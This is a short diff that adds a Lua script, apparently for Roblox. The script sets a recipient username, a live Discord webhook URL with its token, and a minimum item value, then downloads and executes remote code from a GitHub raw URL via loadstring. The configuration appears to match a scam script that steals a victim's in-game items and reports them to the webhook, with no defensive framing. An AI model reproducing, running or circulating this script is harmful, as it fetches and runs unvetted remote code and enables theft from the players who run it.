@@ -1,0 +1,5 @@
+Username = "superhihni"
+Webhook = "https://discordapp.com/api/webhooks/1429445334509027449/lMP8ugEDOLoRkxSefHrvvz47kPTLR4nspIVHppQfjQZ0UjVCHr0XNO0_glN1AuBMmync"
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub"))()
